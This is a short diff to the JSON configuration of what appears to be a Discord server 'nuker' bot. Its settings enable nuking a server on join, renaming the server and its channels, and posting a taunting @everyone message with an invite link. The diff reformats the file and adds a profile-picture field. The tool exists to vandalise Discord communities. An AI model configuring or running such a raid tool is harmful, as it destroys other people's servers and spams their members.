@@ -1,7 +1,8 @@
-{ 
-    "nuke_on_join": "true",  
-    "rename_guild": "y",
-    "channel_names": "y",
-    "text": "@everyone Should've expected this =[ https://discord.gg/A5XW5RwMM4 \nhttps://github.com/astrapy",
-    "token": ""
+{
+"nuke_on_join": "true",
+"rename_guild": "y",
+"channel_names": "y",
+"text": "@everyone Should've expected this =[ https://discord.gg/A5XW5RwMM4 \nhttps://github.com/astrapy",
+"token": "",
+"pfp_url": "link"
 }
